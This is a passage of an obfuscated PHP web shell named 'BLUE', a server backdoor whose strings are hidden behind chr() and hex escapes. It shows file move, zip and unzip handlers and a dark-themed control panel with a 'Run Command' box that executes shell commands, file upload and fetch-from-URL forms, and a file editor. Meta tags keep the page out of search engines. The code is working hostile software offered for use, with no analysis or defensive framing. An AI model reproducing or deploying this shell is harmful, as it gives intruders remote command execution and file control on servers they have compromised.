                $_4d83b1 = (string)(isset($_POST[chr(115).chr(114).chr(99)]) ? $_POST[chr(115).chr(114).chr(99)] : "");
                $_b8c427 = (string)(isset($_POST[chr(100).chr(115).chr(116)]) ? $_POST[chr(100).chr(115).chr(116)] : "");
                $_7917e4 = _f0686cac3($_2c22b0, $_4d83b1);
                if ($_4d83b1 === "" || !file_exists($_7917e4)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x4d\x6f\x76\x65\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x73\x6f\x75\x72\x63\x65\x20\x6d\x69\x73\x73\x69\x6e\x67";
                    biru_redirect($_2c22b0);
                }
                if ($_b8c427 === "") {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x4d\x6f\x76\x65\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x64\x65\x73\x74\x69\x6e\x61\x74\x69\x6f\x6e\x20\x65\x6d\x70\x74\x79";
                    biru_redirect($_2c22b0);
                }
                if (!is_dir($_b8c427)) {
                    $_SESSION["\x6d\x73\x67"] = chr(77).chr(111).chr(118).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32).chr(100).chr(101).chr(115).chr(116).chr(105).chr(110).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(105).chr(115).chr(32).chr(110).chr(111).chr(116).chr(32).chr(97).chr(32).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121);
                    biru_redirect($_2c22b0);
                }
                $_1fe501 = _f0686cac3($_b8c427, basename($_4d83b1));
                if (@realpath($_7917e4) === @realpath($_1fe501)) {
                    $_SESSION["\x6d\x73\x67"] = "\x4d\x6f\x76\x65\x20\x73\x6b\x69\x70\x70\x65\x64\x20\x28\x73\x61\x6d\x65\x20\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x29";
                    biru_redirect($_2c22b0);
                }
                $_c3adcc = @rename($_7917e4, $_1fe501);
                $_SESSION["\x6d\x73\x67"] = $_c3adcc ? "\x4d\x6f\x76\x65\x20\x4f\x4b" : "\x4d\x6f\x76\x65\x20\x66\x61\x69\x6c\x65\x64";
                biru_redirect($_2c22b0);
            }
        case "\x7a\x69\x70": {
                $_0b4e31 = isset($_POST[chr(105).chr(116).chr(101).chr(109).chr(115)]) ? $_POST["\x69\x74\x65\x6d\x73"] : array();
                $_bc4c7b = trim((string)(isset($_POST[chr(122).chr(105).chr(112).chr(110).chr(97).chr(109).chr(101)]) ? $_POST["\x7a\x69\x70\x6e\x61\x6d\x65"] : ""));
                if (!is_array($_0b4e31) || empty($_0b4e31)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(90).chr(105).chr(112).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32).chr(110).chr(111).chr(116).chr(104).chr(105).chr(110).chr(103).chr(32).chr(115).chr(101).chr(108).chr(101).chr(99).chr(116).chr(101).chr(100);
                    biru_redirect($_2c22b0);
                }
                if ($_bc4c7b === '')
                    $_bc4c7b = "\x61\x72\x63\x68\x69\x76\x65\x2d" . date("\x59\x6d\x64\x2d\x48\x69\x73") . chr(46).chr(122).chr(105).chr(112);
                $_55ad01 = _f0686cac3($_2c22b0, $_bc4c7b);

                $_132513 = false;
                $_9043da = "";
                if (class_exists("\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65")) {
                    $_37b30b = new ZipArchive();
                    if ($_37b30b->open($_55ad01, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                        foreach ($_0b4e31 as $_204cc4) {
                            $_3e9f1a = _f0686cac3($_2c22b0, $_204cc4);
                            if (is_dir($_3e9f1a)) {
                                $_d374ce = rtrim($_204cc4, DIRECTORY_SEPARATOR);
                                _f7db9dbf1($_37b30b, $_3e9f1a, $_d374ce);
                            }
                            elseif (is_file($_3e9f1a)) {
                                $_37b30b->addFile($_3e9f1a, basename($_204cc4));
                            }
                        }
                        $_37b30b->close();
                        $_132513 = true;
                    }
                    else {
                        $_9043da = "\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65\x20\x6f\x70\x65\x6e\x20\x66\x61\x69\x6c\x65\x64";
                    }
                }
                if (!$_132513) {
                    if (class_exists(chr(80).chr(104).chr(97).chr(114).chr(68).chr(97).chr(116).chr(97))) {
                        try {
                            $_d2df55 = preg_replace("\x7e\x5c\x2e\x7a\x69\x70\x24\x7e\x69", "\x2e\x74\x61\x72", $_55ad01);
                            $_6e65f2 = new PharData($_d2df55);
                            foreach ($_0b4e31 as $_204cc4) {
                                $_3e9f1a = _f0686cac3($_2c22b0, $_204cc4);
                                if (is_dir($_3e9f1a)) {
                                    $_6e65f2->addEmptyDir(basename($_204cc4));
                                    _f4cf5695f($_6e65f2, $_3e9f1a, basename($_204cc4));
                                }
                                elseif (is_file($_3e9f1a)) {
                                    $_6e65f2->addFile($_3e9f1a, basename($_204cc4));
                                }
                            }
                            unset($_6e65f2);
                            $_SESSION["\x6d\x73\x67"] = "\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65\x20\x6e\x6f\x74\x20\x61\x76\x61\x69\x6c\x61\x62\x6c\x65\x3b\x20\x63\x72\x65\x61\x74\x65\x64\x20\x54\x41\x52\x20\x69\x6e\x73\x74\x65\x61\x64\x3a\x20" . basename($_d2df55);
                            biru_redirect($_2c22b0);
                        }
                        catch (Exception $_62af60) {
                            $_9043da = chr(84).chr(65).chr(82).chr(32).chr(102).chr(97).chr(108).chr(108).chr(98).chr(97).chr(99).chr(107).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32) . $_62af60->getMessage();
                        }
                    }
                    else {
                        $_9043da = ($_9043da ? $_9043da . "\x3b\x20" : "") . "\x4e\x6f\x20\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65\x20\x6e\x6f\x72\x20\x50\x68\x61\x72\x44\x61\x74\x61\x20\x61\x76\x61\x69\x6c\x61\x62\x6c\x65";
                    }
                }
                $_SESSION["\x6d\x73\x67"] = $_132513 ? (chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(58).chr(32) . basename($_55ad01)) : ("\x5a\x69\x70\x20\x66\x61\x69\x6c\x65\x64\x3a\x20" . $_9043da);
                biru_redirect($_2c22b0);
            }
        case chr(117).chr(110).chr(122).chr(105).chr(112): {
                $_4f768b = _f0686cac3($_2c22b0, isset($_POST[chr(102).chr(105).chr(108).chr(101)]) ? $_POST[chr(102).chr(105).chr(108).chr(101)] : "");
                if (!is_file($_4f768b)) {
                    $_SESSION["\x6d\x73\x67"] = chr(85).chr(110).chr(122).chr(105).chr(112).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32).chr(102).chr(105).chr(108).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100);
                    biru_redirect($_2c22b0);
                }
                $_337bff = strtolower(pathinfo($_4f768b, PATHINFO_EXTENSION));
                $_c3adcc = false;
                $_9043da = '';
                if ($_337bff === chr(122).chr(105).chr(112) && class_exists("\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65")) {
                    $_37b30b = new ZipArchive();
                    if ($_37b30b->open($_4f768b) === true) {
                        $_c3adcc = $_37b30b->extractTo($_2c22b0);
                        $_37b30b->close();
                        if (!$_c3adcc)
                            $_9043da = "\x5a\x69\x70\x20\x65\x78\x74\x72\x61\x63\x74\x54\x6f\x20\x66\x61\x69\x6c\x65\x64";
                    }
                    else {
                        $_9043da = chr(90).chr(105).chr(112).chr(32).chr(111).chr(112).chr(101).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                    }
                }
                else {
                    try {
                        if (class_exists(chr(80).chr(104).chr(97).chr(114).chr(68).chr(97).chr(116).chr(97)) && preg_match("\x7e\x5c\x2e\x28\x74\x61\x72\x7c\x74\x61\x72\x5c\x2e\x67\x7a\x7c\x74\x61\x72\x5c\x2e\x62\x7a\x32\x7c\x74\x61\x72\x5c\x2e\x78\x7a\x29\x24\x7e\x69", $_4f768b)) {
                            $_6e65f2 = new PharData($_4f768b);
                            $_6e65f2->extractTo($_2c22b0, null, true);
                            $_c3adcc = true;
                        }
                        else {
                            $_9043da = chr(85).chr(110).chr(115).chr(117).chr(112).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100).chr(32).chr(97).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(116).chr(121).chr(112).chr(101).chr(32).chr(111).chr(114).chr(32).chr(80).chr(104).chr(97).chr(114).chr(68).chr(97).chr(116).chr(97).chr(32).chr(110).chr(111).chr(116).chr(32).chr(97).chr(118).chr(97).chr(105).chr(108).chr(97).chr(98).chr(108).chr(101);
                        }
                    }
                    catch (Exception $_62af60) {
                        $_9043da = $_62af60->getMessage();
                    }
                }
                $_SESSION["\x6d\x73\x67"] = $_c3adcc ? chr(85).chr(110).chr(122).chr(105).chr(112).chr(32).chr(79).chr(75) : (chr(85).chr(110).chr(122).chr(105).chr(112).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32) . $_9043da);
                biru_redirect($_2c22b0);
            }
    }
}



function _f7db9dbf1($_37b30b, $_425e76, $_8824ba)
{
    $_425e76 = rtrim($_425e76, DIRECTORY_SEPARATOR);
    if (method_exists($_37b30b, "\x61\x64\x64\x45\x6d\x70\x74\x79\x44\x69\x72"))
        $_37b30b->addEmptyDir($_8824ba);
    $_84c87b = @opendir($_425e76);
    if (!$_84c87b)
        return;
    while (false !== ($_62af60 = readdir($_84c87b))) {
        if ($_62af60 === "\x2e" || $_62af60 === "\x2e\x2e")
            continue;
        $_3e9f1a = $_425e76 . DIRECTORY_SEPARATOR . $_62af60;
        $_9a7e54 = $_8824ba . "\x2f" . basename($_62af60);
        if (is_dir($_3e9f1a))
            _f7db9dbf1($_37b30b, $_3e9f1a, $_9a7e54);
        elseif (is_file($_3e9f1a) && method_exists($_37b30b, "\x61\x64\x64\x46\x69\x6c\x65"))
            $_37b30b->addFile($_3e9f1a, $_9a7e54);
    }
    closedir($_84c87b);
}
function _f4cf5695f($_6e65f2, $_425e76, $_8824ba)
{
    $_425e76 = rtrim($_425e76, DIRECTORY_SEPARATOR);
    $_84c87b = @opendir($_425e76);
    if (!$_84c87b)
        return;
    while (false !== ($_62af60 = readdir($_84c87b))) {
        if ($_62af60 === chr(46) || $_62af60 === "\x2e\x2e")
            continue;
        $_3e9f1a = $_425e76 . DIRECTORY_SEPARATOR . $_62af60;
        $_9a7e54 = $_8824ba . chr(47) . basename($_62af60);
        if (is_dir($_3e9f1a)) {
            if (method_exists($_6e65f2, "\x61\x64\x64\x45\x6d\x70\x74\x79\x44\x69\x72"))
                $_6e65f2->addEmptyDir($_9a7e54);
            _f4cf5695f($_6e65f2, $_3e9f1a, $_9a7e54);
        }
        elseif (is_file($_3e9f1a) && method_exists($_6e65f2, "\x61\x64\x64\x46\x69\x6c\x65")) {
            $_6e65f2->addFile($_3e9f1a, $_9a7e54);
        }
    }
    closedir($_84c87b);
}


$_0b4e31 = _fb2abba76($_2c22b0);
$_b8b343 = array();
$_fff722 = array();
foreach ($_0b4e31 as $_204cc4) {
    $_3e9f1a = $_2c22b0 . DIRECTORY_SEPARATOR . $_204cc4;
    if (is_dir($_3e9f1a))
        $_fff722[] = $_204cc4;
    else
        $_b8b343[] = $_204cc4;
}
$_10b361 = defined(chr(83).chr(79).chr(82).chr(84).chr(95).chr(78).chr(65).chr(84).chr(85).chr(82).chr(65).chr(76));
$_8ca1a9 = defined(chr(83).chr(79).chr(82).chr(84).chr(95).chr(70).chr(76).chr(65).chr(71).chr(95).chr(67).chr(65).chr(83).chr(69));
if ($_10b361) {
    sort($_fff722, $_8ca1a9 ? (SORT_NATURAL | SORT_FLAG_CASE) : SORT_NATURAL);
    sort($_b8b343, $_8ca1a9 ? (SORT_NATURAL | SORT_FLAG_CASE) : SORT_NATURAL);
}
else {
    natcasesort($_fff722);
    $_fff722 = array_values($_fff722);
    natcasesort($_b8b343);
    $_b8b343 = array_values($_b8b343);
}

$_905ccf = dirname($_2c22b0);
if ($_905ccf === $_2c22b0)
    $_905ccf = $_2c22b0;

$_8ee77a = ((((isset($_GET["\x61"]) ? $_GET["\x61"] : "") === "\x65\x64\x69\x74")) && isset($_GET[chr(102)])) ? _f0686cac3($_2c22b0, $_GET[chr(102)]) : null;
$_18b9dd = ($_8ee77a && is_file($_8ee77a)) ? $_8ee77a : null;

$_081a8b = ((((isset($_GET[chr(97)]) ? $_GET[chr(97)] : "") === "\x76\x69\x65\x77")) && isset($_GET["\x66"])) ? _f0686cac3($_2c22b0, $_GET[chr(102)]) : null;
$_a2e431 = ($_081a8b && is_file($_081a8b)) ? $_081a8b : null;

$_4b3b3c = isset($_GET["\x6d\x6f\x64\x65"]) ? $_GET["\x6d\x6f\x64\x65"] : "\x61\x75\x74\x6f";
$_a3efa8 = in_array($_4b3b3c, array("\x74\x78\x74", "\x62\x36\x34", chr(97).chr(117).chr(116).chr(111)), true) ? $_4b3b3c : chr(97).chr(117).chr(116).chr(111);

$_223b4a = isset($_SESSION[chr(99).chr(115).chr(114).chr(102)]) ? $_SESSION[chr(99).chr(115).chr(114).chr(102)] : '';
$_f0eef3 = date(chr(89));
?>
    <!doctype html>
    <html lang="en" class="dark">
    <head>
        <meta charset="utf-8">
        <title>BLUE</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
        <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
        <script src="https://cdn.tailwindcss.com"></script>
        <script>
            tailwind.config = { darkMode:'class', theme:{ extend:{
                        fontFamily:{ ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans'] },
                        colors:{ canvas:{DEFAULT:'#0b1220',light:'#0b1220',surface:'rgba(15,23,42,.8)'}, brand:{50:'#eef2ff',500:'#6366f1',600:'#5458ee',700:'#4338ca'} },
                        boxShadow:{ card:'0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03)' , glow:'0 6px 20px rgba(99,102,241,.25)' },
                        borderRadius:{ xl2:'18px' }
                    } } }
        </script>
        <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
        <link href="https://www.svgrepo.com/show/475654/github-color.svg" rel="icon">

        <!-- CodeMirror 5 -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
        <style>
            .CodeMirror{ border:1px solid rgba(148,163,184,.18); border-radius:12px; height:420px; background:#0b1220; color:#e5e7eb; }
            .cm-s-material-darker .CodeMirror-gutters{ background:#0b1220; border-right:1px solid rgba(148,163,184,.18); }

            html,body{height:100%}
            body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
            .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(99,102,241,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:grid; grid-template-rows:auto 1fr auto;}
            .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
            .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.5rem .75rem;width:100%;background:#0b1220;color:#e5e7eb;}
            .field:focus{outline:none;box-shadow:0 0 0 4px rgba(99,102,241,.25);border-color:#6366f1}
            .btn{background:linear-gradient(180deg,#6366f1,#4f46e5);color:#eef2ff;border-radius:10px;padding:.5rem .75rem;font-weight:700;font-size:.875rem;line-height:1.25rem;display:inline-flex;align-items:center;justify-content:center;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(99,102,241,.22);}
            .btn:hover{filter:brightness(1.06);box-shadow:0 10px 26px rgba(99,102,241,.35)} .btn:active{transform:translateY(.5px)}
            .btn-ghost{background:transparent;border:1px solid rgba(148,163,184,.25);color:#e5e7eb;}
            .btn-xs{padding:.25rem .5rem;font-size:.75rem;border-radius:8px}.btn-sm{padding:.35rem .6rem;font-size:.8125rem;border-radius:9px}.btnw{min-width:96px}
            .tbl thead th{position:sticky;top:0;background:#0b1220e6;backdrop-filter:blur(6px);z-index:1;color:#cbd5e1}
            .tbl tbody tr:nth-child(even){background:rgba(148,163,184,.04)}
            .tbl tbody tr.hoverable:hover{background:rgba(99,102,241,.22);box-shadow:inset 0 0 0 9999px rgba(99,102,241,.10)}
            .tbl tbody tr.hoverable{transition:background .15s ease}
            .ico{width:18px;height:18px;display:inline-block;vertical-align:text-bottom;color:#cbd5e1}
            .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
            .badge-small{font-size:11px;padding:.1rem .4rem;border-radius:999px;background:#111827;color:#c7d2fe;border:1px solid #374151}
            .row-actions{display:grid;grid-template-columns:repeat(8, minmax(90px, auto));gap:.35rem;justify-items:start}
            @media (max-width:1200px){ .row-actions{grid-template-columns:repeat(3, minmax(90px, auto));} }
            .tablewrap{height:calc(100vh - 320px);overflow:auto}
            @media (max-height:800px){ .tablewrap{height:calc(100vh - 360px)} }
            .drop-hint{border:2px dashed rgba(99,102,241,.45); background:rgba(99,102,241,.06)}
            .droptarget{outline:2px dashed rgba(99,102,241,.7); outline-offset:-2px}
            /*#tableCard{ min-height: calc(100vh - 260px); }*/

            /* Command editors */
            .cm-cmd-input { font-size:13px; line-height:1.45; }
            .cm-cmd-input .CodeMirror { width:100% !important; }
            .cm-cmd-input .CodeMirror-scroll { height:36px !important; } /* single line */
            .cm-cmd-input .CodeMirror { height:36px !important; }
            .cm-cmd-output { font-size:14px; line-height:1.5; }
            .cm-cmd-output .CodeMirror { width:100% !important; }
            .cm-cmd-output .CodeMirror-scroll { height:380px !important; }

            /* Command width is capped so it doesn't get too long */
            .cmd-container{ max-width:600px; width:100%; }
            @media (min-width:1536px){ .cmd-container{ max-width:680px; } }

            /* Make table copy-friendly */
            #tableCard, #tableCard * { user-select: text; -webkit-user-select: text; }

            /* Force ALL links inside the directory table to be white */
            #dirTable a, #dirTable a:visited { color:#ffffff !important; }

            /* Footer gradient line */
            .footer-line{height:1px;background:linear-gradient(90deg,rgba(99,102,241,.0),rgba(99,102,241,.5),rgba(99,102,241,.0));}

            /* Grey placeholder for the CodeMirror command field */
            .cm-cmd-input .CodeMirror-empty .CodeMirror-placeholder {
                color:#94a3b8; /* slate-400 */
                opacity:.95;
            }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/mode/loadmode.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/meta.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/closebrackets.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/selection/active-line.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/display/placeholder.min.js"></script>
    </head>
    <body class="shell text-slate-100" id="bodyRoot">
    <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-slate-900/70 backdrop-blur">
        <div class="w-full px-6 py-3 flex items-center justify-between gap-3">
            <div class="flex items-center gap-3 shrink-0">
                <div class="text-2xl"><?php echo _f04034bc2("\x70\x77\x78", "\x69\x63\x6f"); ?></div>
                <div>
                    <div class="text-lg font-semibold tracking-tight" style="background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent"><a href="?">BLUE</a></div>
                    <div class="text-xs text-slate-400">PHP <?php echo h(PHP_VERSION); ?></div>
                </div>
            </div>

            <div class="hidden md:flex items-center gap-2 rounded-xl border border-slate-700 bg-slate-900/60 px-2 py-1 shrink-0">
                <?php echo _f04034bc2(chr(115).chr(101).chr(97).chr(114).chr(99).chr(104), "\x69\x63\x6f"); ?>
                <input id="searchBox" type="search" placeholder="Filter by name (Ctrl+/)" class="bg-transparent text-sm outline-none placeholder:text-slate-500 w-64" oninput="filterRows()">
            </div>

            <div class="text-sm text-slate-300 hidden lg:block truncate">
                Path: <span class="mono"><?php echo h($_2c22b0); ?></span>
            </div>

            <!-- Command (dibatasi lebar) -->
            <div class="cmd-container ml-auto">
                <form method="post" action="?a=cmd&p=<?php echo rawurlencode($_2c22b0); ?>" class="hidden md:flex items-center gap-2 w-full" id="cmdForm">
                    <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                    <textarea id="cmdTA" name="cmd" class="field mono w-full" placeholder="Run Command" rows="1"></textarea>
                    <button class="btn btn-sm shrink-0" type="submit">Run</button>
                </form>
            </div>

            <form method="post" action="?a=logout&p=<?php echo rawurlencode($_2c22b0); ?>" class="ml-1 shrink-0">
                <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                <button class="btn btn-sm" type="submit">Logout</button>
            </form>
        </div>
    </header>

    <main class="w-full px-6 py-4 grid grid-cols-12 gap-4">

        <?php if (!empty($_SESSION[chr(99).chr(109).chr(100).chr(95).chr(114).chr(101).chr(115).chr(117).chr(108).chr(116)])):
    $_5564ce = $_SESSION[chr(99).chr(109).chr(100).chr(95).chr(114).chr(101).chr(115).chr(117).chr(108).chr(116)];
    unset($_SESSION[chr(99).chr(109).chr(100).chr(95).chr(114).chr(101).chr(115).chr(117).chr(108).chr(116)]); ?>
            <section class="col-span-12">
                <div class="card p-4 mb-4">
                    <details open>
                        <summary class="cursor-pointer font-medium">
                            Command Output × <span class="mono"><?php echo h($_5564ce["\x63\x6d\x64"]); ?></span>
                            <span class="ml-2 text-xs text-slate-400">via <?php echo h($_5564ce[chr(109).chr(101).chr(116).chr(104).chr(111).chr(100)]); ?>, exit <?php echo h((string)$_5564ce[chr(99).chr(111).chr(100).chr(101)]); ?></span>
                        </summary>
                        <pre id="cmdOutPre" class="mt-3 p-3 bg-black/40 rounded-lg overflow-auto text-xs mono border border-slate-700" style="max-height: 480px;"><?php echo h($_5564ce["\x6f\x75\x74"]); ?></pre>
                    </details>
                </div>
            </section>
        <?php
endif; ?>

        <!-- SIDEBAR -->
        <aside class="col-span-12 xl:col-span-3 space-y-4">
            <?php if (!empty($_SESSION["\x6d\x73\x67"])): ?>
                <div class="rounded-xl border border-blue-900/60 bg-blue-900/20 text-blue-100 px-4 py-3">
                    <?php echo h($_SESSION["\x6d\x73\x67"]);
    unset($_SESSION["\x6d\x73\x67"]); ?>
                </div>
            <?php
endif; ?>

            <section class="card p-4">
                <h2 class="font-medium mb-3">Navigation</h2>
                <div class="mb-2 text-sm text-slate-300">Breadcrumbs</div>
                <div class="flex flex-wrap gap-1 text-sm">
                    <?php foreach (_fca8d0de2($_2c22b0) as $_81ebb5 => $_2a24d5):
    list($_bc4c7b, $_013f0a) = $_2a24d5; ?>
                        <?php if ($_81ebb5)
        echo chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).chr(116).chr(101).chr(120).chr(116).chr(45).chr(115).chr(108).chr(97).chr(116).chr(101).chr(45).chr(54).chr(48).chr(48).chr(34).chr(62).chr(47).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62); ?>
                        <a href="?p=<?php echo rawurlencode($_013f0a); ?>" class="inline-flex items-center gap-1 px-2 py-1 rounded-md border border-slate-700 bg-slate-800 text-slate-200 hover:border-slate-500 hover:bg-slate-700 transition"><?php echo h($_bc4c7b); ?></a>
                    <?php
endforeach; ?>
                </div>
                <hr class="my-4 border-slate-700">
                <form method="get" class="space-y-2">
                    <label class="text-sm text-slate-300">Change Path</label>
                    <input type="text" name="p" class="field mono" placeholder="/home/user" value="<?php echo h($_2c22b0); ?>">
                    <div class="flex gap-2">
                        <button class="btn btnw" type="submit">Go</button>
                        <a class="btn btnw" href="?">Go to CWD</a>
                    </div>
                </form>
            </section>

            <!-- CREATE: New File / New Folder -->
            <section class="card p-4">
                <h2 class="font-medium mb-3">Create</h2>

                <form method="post" action="?a=new-file&p=<?php echo rawurlencode($_2c22b0); ?>" class="space-y-2">
                    <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                    <label class="text-sm text-slate-300">New File</label>
                    <input type="text" name="name" class="field mono" placeholder="newfile.txt" required>
                    <textarea name="content" class="field mono" rows="2" placeholder="(Optional) initial content; jika kosong akan diisi timestamp otomatis"></textarea>
                    <button class="btn w-full" type="submit">Create File</button>
                    <div class="text-xs text-slate-400">Dibuat non-0 byte dengan beberapa fallback (lintas versi PHP).</div>
                </form>

                <hr class="my-3 border-slate-700">

                <form method="post" action="?a=new-dir&p=<?php echo rawurlencode($_2c22b0); ?>" class="space-y-2">
                    <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                    <label class="text-sm text-slate-300">New Folder</label>
                    <input type="text" name="name" class="field mono" placeholder="NewFolder" required>
                    <button class="btn w-full" type="submit">Create Folder</button>
                </form>
            </section>

            <section class="card p-4">
                <h2 class="font-medium mb-3">Upload</h2>
                <div class="grid grid-cols-1 gap-4">
                    <form method="post" enctype="multipart/form-data" action="?a=upload&p=<?php echo rawurlencode($_2c22b0); ?>" class="space-y-2">
                        <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                        <input type="file" name="files[]" multiple class="block text-sm file:mr-3 file:rounded-md file:border file:border-slate-700 file:px-3 file:py-1.5 file:bg-slate-800 file:text-slate-200">
                        <button class="btn w-full" type="submit">Upload Files</button>
                        <div class="text-xs text-slate-400">Fallback order: move × rename × copy × get+put × stream copy.</div>
                    </form>

                    <form onsubmit="return false" class="space-y-2">
                        <input type="hidden" id="chunkCsrf" value="<?php echo h($_223b4a); ?>">
                        <input type="file" id="chunkFiles" multiple class="block text-sm file:mr-3 file:rounded-md file:border file:border-slate-700 file:px-3 file:py-1.5 file:bg-slate-800 file:text-slate-200">
                        <label class="text-xs text-slate-300 flex items-center gap-2">Chunk size (chars)
                            <input type="number" id="chunkSize" class="field w-28 mono" min="1" step="1" value="3000">
                        </label>
                        <button class="btn w-full" type="button" id="chunkUploadBtn" onclick="startChunkUpload()">Upload (Chunked)</button>
                        <div id="chunkProgressWrap" class="hidden">
                            <div style="height:8px;border-radius:999px;background:rgba(148,163,184,.25);overflow:hidden">
                                <div id="chunkBar" style="height:100%;width:0%;background:linear-gradient(90deg,#93c5fd,#6366f1);transition:width .15s"></div>
                            </div>
                            <div id="chunkStatus" class="text-xs text-slate-300 mt-1 mono"></div>
                        </div>
                        <div class="text-xs text-slate-400">Streams each file to the server in chunks of the size set above (default 3000 chars), pausing 50&nbsp;ms between chunks. The final file is verified by size before it&rsquo;s saved.</div>
                    </form>

                    <form method="post" action="?a=url-upload&p=<?php echo rawurlencode($_2c22b0); ?>" class="space-y-2">
                        <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                        <input type="url" name="url" class="field" placeholder="https://example.com/file.txt" required>
                        <input type="text" name="filename" class="field" placeholder="File name (optional)">
                        <button class="btn w-full" type="submit">Fetch from URL</button>
                        <div class="text-xs text-slate-400">Methods: cURL × copy(stream) × get+put × stream copy.</div>
                    </form>
                    <div class="text-xs text-slate-400">
                        Tip: You can also drag &amp; drop files anywhere on this page to upload.
                    </div>
                </div>
            </section>
        </aside>

        <!-- MAIN: Editor / Preview panels + Table -->
        <section class="col-span-12 xl:col-span-9 flex flex-col gap-4">

            <?php if ($_18b9dd): ?>
                <?php
    $_922198 = ($_a3efa8 === chr(97).chr(117).chr(116).chr(111));
    if ($_922198) {
        $_a3efa8 = _f6b64c028($_18b9dd) ? "\x74\x78\x74" : chr(98).chr(54).chr(52);
    }
    $_2d6c73 = @file_get_contents($_18b9dd);
    if ($_2d6c73 === false) {
        $_2d6c73 = "";
    }
    $_d51ee4 = ($_a3efa8 === chr(98).chr(54).chr(52)) ? base64_encode($_2d6c73) : $_2d6c73; ?>
                <div class="card p-4" id="editPanelWrap">
                    <details id="editPanel" open>
                        <summary class="cursor-pointer font-medium flex items-center justify-between">
                            <div class="flex items-center gap-2">
                                <span>Edit File</span>
                                <span class="text-xs text-slate-400">Size: <?php echo h(_fb575e97d((int)@filesize($_18b9dd))); ?></span>
                            </div>
                            <div class="flex items-center gap-2">
                                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('editPanel').open=false">Close</button>
                            </div>
                        </summary>

                        <div class="mt-3 text-xs text-slate-400 mono line-clamp-2"><?php echo h($_18b9dd); ?></div>

                        <div class="mt-2">
